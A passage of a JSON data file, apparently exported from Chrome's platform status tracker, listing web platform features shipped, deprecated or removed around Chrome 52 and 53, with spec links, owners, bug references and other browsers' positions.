      "by": "awdf@chromium.org"
    },
    "name": "Notification badges",
    "tags": [
      "notification",
      "badge",
      "icon",
      "image",
      "small"
    ],
    "comments": "On Android the badge is used as the status bar notification image from Android M onwards. From M67, on Samsung devices this will be restricted to N+, see https://crbug.com/829367.",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "peter@chromium.org",
          "awdf@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=591394",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A badge image may be used to represent a notification when there is not enough space to display the notification itself. It may also be displayed inside the notification, but then it should have less visual priority than the notification icon.",
    "id": 5630897160192000,
    "resources": {
      "docs": [
        "https://github.com/whatwg/notifications/issues/65",
        "https://github.com/whatwg/notifications/pull/67"
      ],
      "samples": [
        "https://tests.peter.sh/notification-generator/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:03.827070",
      "by": "ericbidelman@google.com"
    },
    "name": "Promise-based getUserMedia",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/mediacapture-main/#dom-mediadevices-getusermedia",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/36#InterfacesAPIsDOM",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "hta@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "ios": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/607439",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2015/05/13/announcing-media-capture-functionality-in-microsoft-edge/",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Adds the API navigator.mediaDevices.getUserMedia(), which returns a promise.\r\n\r\nAs part of this feature, also release the unprefixed version of navigator.getUserMedia(), which uses callbacks.\r\n",
    "id": 5755699816562688,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/docs/Web/API/MediaDevices/getUserMedia",
        "https://developers.google.com/web/updates/2015/10/media-devices"
      ]
    }
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:28:44.863430",
      "by": "ericbidelman@google.com"
    },
    "name": "Raster on composited layer scale change, except if will-change: transform or an accelerated animation is present",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "chrishtr@chromium.org",
          "danakj@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "All content will be re-rastered when its transform scale changes, iff it does not have the will-change: transform CSS property. In other words, `will-change: transform` means \"please animate it fast\". This only applies to transforms scales that happen via script manipulation, and does not apply to CSS animations. This means your site will likely get better-looking content, but it may also be slower without some simple changes outlined below.\r\n",
    "id": 5637351992721408,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1f8WS99F9GORWP_m74l_JfsTHgCrHkbEorHYu72D4Xag/"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-will-change-transform-rasterization/index.html"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:36.400330",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove DHE-based ciphers",
    "tags": [
      "tls",
      "ssl",
      "dhe"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc5246",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 53
        },
        "owners": [
          "davidben@chromium.org",
          "awhalley@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "bug": "https://crbug.com/619194",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://www.ssllabs.com/ssltest/viewClient.html?name=Safari&version=9&platform=OS%20X%2010.11",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Last year, we raised the minimum TLS Diffie-Hellman group size from 512-bit to 1024-bit. As mentioned then, 1024-bit is insufficient for the long-term. However, metrics report that around 95% of DHE connections seen by Chrome use 1024-bit DHE. This, compounded with how DHE is negotiated in TLS, makes it difficult to move past 1024-bit. Servers should upgrade to ECDHE if available. Otherwise, ensure a plain-RSA cipher suite is enabled.",
    "id": 5128908798164992,
    "resources": {
      "samples": [
        "https://dh1024.badssl.com/"
      ]
    }
  },
  {
    "category": "File APIs",
    "updated": {
      "when": "2017-06-14 18:29:17.635660",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove FileError interface",
    "tags": [
      "FileError",
      "DOMError",
      "DOMException"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 53
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/496901",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "FileError was removed from File API (https://w3c.github.io/FileAPI/) after Chrome shipped the feature.\r\n\r\nThis surfaces on: FileReader.error, FileWriter.error, and in the FileSystem API passed to the ErrorCallback (async) and thrown (sync)\r\n\r\nOther browsers do not use this, returning DOMError instead, which is itself being deprecated in favor of DOMException.\r\n\r\nThe interface has been deprecated since 2013. In Chrome 53 we're adding a console warning. Removal is anticipated in Chrome 54.",
    "id": 6687420359639040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FileError"
      ]
    }
  },
  {
    "category": "Web Components",
    "updated": {
      "when": "2018-04-13 15:26:53.978040",
      "by": "ericbidelman@google.com"
    },
    "name": "Shadow DOM v1",
    "tags": [
      "shadow dom",
      "web components"
    ],
    "comments": "Intent to implement: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/Ez2cuT0KmQo\r\nSpec issues: https://github.com/w3c/webcomponents/labels/v1",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "http://w3c.github.io/webcomponents/spec/shadow/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=811542",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "hayato@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "ios": 53,
        "blink_components": [
          "Blink>DOM>ShadowDOM"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://crbug.com/531990",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://blogs.windows.com/msedgedev/2015/07/15/microsoft-edge-and-web-components/",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=148695",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The new Shadow DOM APIs, called *v1*, including, but not limited to:\r\n\r\n- Element.attachShadow\r\n- New HTML Element: HTMLSlotElement\r\n- Slotable.assignedSlot\r\n- Event.composed, Event.composedPath()\r\n\r\nSee http://hayato.io/2016/shadowdomv1/ for the difference between v0 and v1.\r\nIntent to Ship: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/zrZRD2ls5tw\r\n",
    "id": 4667415417847808,
    "resources": {
      "docs": [
        "https://developers.google.com/web/fundamentals/web-components/shadowdom"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:43.574650",
      "by": "ericbidelman@google.com"
    },
    "name": "TextEncoder API: drop support for legacy encodings ",
    "tags": [
      "encoding textencoder utf8 utf-8 utf16 utf-16"
    ],
    "comments": "Intent to Deprecate and Remove: https://groups.google.com/a/chromium.org/d/msg/blink-dev/13uMPjRqY94/lhPLKRJnAwAJ\r\n",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://encoding.spec.whatwg.org/",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 53
        },
        "owners": [
          "jsbell@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "ios": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=595351",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The TextEncoder API never supported legacy encodings (such as 'shift_jis', 'windows-1252', etc) except for two UTF-16 variants ('utf-16', 'utf-16be'). Usage was minimal and support was removed from the spec. The TextEncoder constructor will no longer take an argument (if one is passed it is ignored, as is the standard for DOM APIs), and will always encode to \"the encoding\" (utf-8).",
    "id": 5630760492990464,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder",
        "",
        "(Docs still refer to the utfLabel parameter, which is no longer supported.)"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:30.015670",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed CSS Filters",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/filters/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1057180",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "fs@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=613441",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/filters",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=148138",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS Filters without the -webkit- prefix.",
    "id": 4711498777624576,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/filter"
      ],
      "samples": [
        "http://simpl.info/cssfilters/",
        "https://docs.webplatform.org/wiki/tutorials/css_filters"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:53.501470",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: New lowpass and highpass BiquadFilter implementation",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 53
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 53,
        "ios": 53,
        "blink_components": [
          "Blink"
        ],
        "desktop": 53,
        "flag": false,
        "android": 53,
        "bug": "http://crbug.com/597432",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The existing lowpass and highpass BiquadFilter implementation has a defect where valid filters cannot be represented.  To fix this, the filter formulas were updated.  However, the new formulas will cause a change in the output of the filters.",
    "id": 5687523284090880,
    "resources": {
      "docs": [
        "http://webaudio.github.io/web-audio-api/#filters-characteristics"
      ],
      "samples": [
        "https://github.com/GoogleChrome/web-audio-samples/wiki/Detection-of-lowpass-BiquadFilter-implementation",
        "https://rtoy.github.io/webaudio-hacks/more/biquad/biquad-lowpass-q.html?usedB=true"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:50.221120",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "-webkit-appearance:none for METER element",
    "tags": [
      "html",
      "meter",
      "appearance"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/css-ui-4/#appearance-switching",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "tkent@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "http://crbug.com/602928",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Web authors had no way to completely disable UA rendering of METER element, and were unable to render them with pure CSS.\r\n\r\nThis feature is to implement the standard appearance:none behavior for METER element as -webkit-appearance:none.\r\n-webkit-appearance:none removes UA rendring at all, and renders the content of <meter> element.\r\n",
    "id": 5668635896971264,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/appearance"
      ],
      "samples": [
        "http://www.am530.de/lab/html5/meter.php",
        ""
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-08-19 20:36:08.903550",
      "by": "ericbidelman@google.com"
    },
    "name": "Alternative Services",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://tools.ietf.org/html/rfc7838",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "bnc@chromium.org",
          "rch@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Internals>Network>HTTP2"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/615115",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Alternative services allow an origin serving an http:// or https:// resource to nominate additional (protocol, host, port) tuples that the client can choose to request the resource from instead of the origin when making subsequent requests.  This can be used, for example, as a protocol upgrade mechanism, for connection pooling, or for load balancing.",
    "id": 5754540846481408,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-08-09 16:22:16.844290",
      "by": "phistuck@chromium.org"
    },
    "name": "CSP3: The 'strict-dynamic' source expression.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/webappsec-csp/#strict-dynamic-usage",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1299483",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/589380",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The 'strict-dynamic' source expression allows script loaded via nonce- or hash-based whitelists to load other script, simplifying the requirements for deployment, and (hopefully!) making it more likely that CSP can reach more sites.",
    "id": 5633814718054400,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives"
      ],
      "samples": [
        "https://csp-experiments.appspot.com/unsafe-dynamic"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:15.321700",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Containment",
    "tags": [
      "contain"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://drafts.csswg.org/css-containment/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1150081",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "eae@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/561713",
        "intervention": false
      },
      "opera": {
        "android": 40,
        "desktop": 40
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/csscontainment",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "A primitive for isolating style, layout, and paint. This allows authors to explicitly opt into a set of restrictions that enables user agent optimizations.",
    "id": 6522186978295808,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/css-containment",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/contain"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:16.201710",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Flexbox: New behavior for absolute-positioned children",
    "tags": [
      "flexbox",
      "flex",
      "abspos"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://drafts.csswg.org/css-flexbox/#abspos-items",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=874718",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "cbiesinger@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=517265",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "A previous version of the Flexbox spec set the static position of abspos children as if they were a 0x0 flex item. However, the latest version of the spec takes them fully out of flow and sets the static position based on align and justify properties.\r\n\r\n(The static position is used when there are no top: or left: or related properties used to position the absolute-positioned element. See the sample below.)",
    "id": 6600926009753600,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/absolute-positioned-children"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-flexbox-abspos/index.html",
        "http://jsbin.com/sikiqedemo/3/edit?html,output"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:14.465850",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate 'X-Frame-Options' support inside '<meta>'.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc7034",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 52
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://crbug.com/603002",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Intent to Deprecate and Remove: https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/R1gkjKZI0J8",
    "id": 6450843930853376,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/chrome-52-deprecations#remove-support-for-x-frame-options-in-meta-tags"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:58.562300",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove: WebKit legacy window.postMessage() overload",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 52
        },
        "owners": [
          "sigbjornf@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 52,
        "ios": 52,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=425896",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "WebKit/Blink supports three overloads of window.postMessage(): \"postMessage(message, targetOrigin)\", \"postMessage(message, targetOrigin, transferables)\" and \"postMessage(message, transferables, targetOrigin)\"\r\n\r\nThe last one being an accident of history as implementation and spec initially evolved, but an overload that got stuck. As it has little or no actual use (Link1), it will be deprecated and removed. Any remaining uses will have to swap arguments.",
    "id": 5719033043222528,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2016/06/chrome-52-deprecations#deprecate-overload-of-postmessage",
        "https://html.spec.whatwg.org/multipage/#dom-window-postmessage",
        "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage",
        ""
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:41.181570",
      "by": "ericbidelman@google.com"
    },
    "name": "Exponentiation Operator (** / **=)",
    "tags": [
      "JavaScript",
      "ES6",
      "ES7",
      "ECMAScript",
      "exponentiation",
      "exponent",
      "Math.pow"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/ecma262/#sec-exp-operator",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1135708",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 52
        },
        "owners": [
          "caitp@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 51,
        "blink_components": [
          "Blink"
        ],
        "desktop": 52,
        "flag": false,
        "android": 52,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=3915",
        "intervention": false
      },
      "opera": {
        "android": 39,
        "desktop": 39
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/commit/9d7e0e4b17bfa3a87c14da8e96cf96b65cb8dbdb",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Provides an arithmetic operator equivalent of Math.pow(), in which the lefthand-side expression serves as the base value, and the righthand-side expression serves as the exponent.",
    "id": 5461064690958336,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Arithmetic_Operators#Exponentiation"
      ],
      "samples": [
        "http://www.2ality.com/2016/02/exponentiation-operator.html",
        "https://blog.mariusschulz.com/2015/11/24/the-exponentiation-operator-in-javascript"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-07-25 04:45:49.923800",
      "by": "tyoshino@chromium.org"
    },
    "name": "Fetch API: Response construction with ReadableStream",
    "tags": [
      "streams",
      "fetch",
      "readable streams",
      "streaming"
    ],
